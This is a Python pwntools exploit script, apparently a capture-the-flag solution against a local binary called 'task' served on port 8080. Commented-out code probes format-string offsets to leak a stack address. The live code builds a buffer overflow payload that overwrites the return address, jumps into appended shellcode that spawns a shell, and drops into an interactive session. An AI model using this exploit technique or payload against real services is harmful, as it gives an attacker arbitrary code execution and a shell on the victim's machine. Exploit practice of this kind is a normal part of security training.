import struct
from pwn import *


binary = context.binary = ELF("./task")
context.log_level = 'error'
#for i in range(1, 80):
#	p = process()
#	# p = remote("127.0.0.1", 8080)
#	d = p.recv().decode()
#	# print()
#	addr = d.split("\n")[1]
#	print(addr)
#	# print(p.recv().decode())
#	# p.sendline(b'%p.'*100 + b'\n')
#	prompt = b'%' + str(i).encode() + b'$p.'
#	# print(prompt)
#	p.sendline(prompt + b'\n')
#	# p.sendline(b's\n')
#	data = p.recv().decode().split(".")[0]
#	check = addr in data
#	print(data, check, i)
#	if check:
#		exit()
#	#	buf_address = int(data, 16)
#	#	print(buf_address)
#	# exit()
#	# exit()
#	p.close()
#exit()

# ^^^^
# God knows, but here we have to do %48$lx - 0x158 to get buffer address
# p = process()
p = remote("127.0.0.1", 8080)
data = p.recv().decode().split()
# print(data)
print(data, int(data[-1], 16))

buf_address = int(data[-1], 16)

# Create payload
payload = b"A" * (0x50 + 0x00) + b'B' * 8  # Fill the buffer
# payload = padding + shellcode + struct.pack("<Q", shellcode_address)  # Add return address

ret_addr = buf_address + len(payload) + 8
payload += p64(ret_addr) + asm(shellcraft.sh())

## Write the payload to a file or directly send it to the program
#with open("payload", "wb") as f:
#    f.write(payload)

p.sendline(payload)

p.interactive()
p.close()
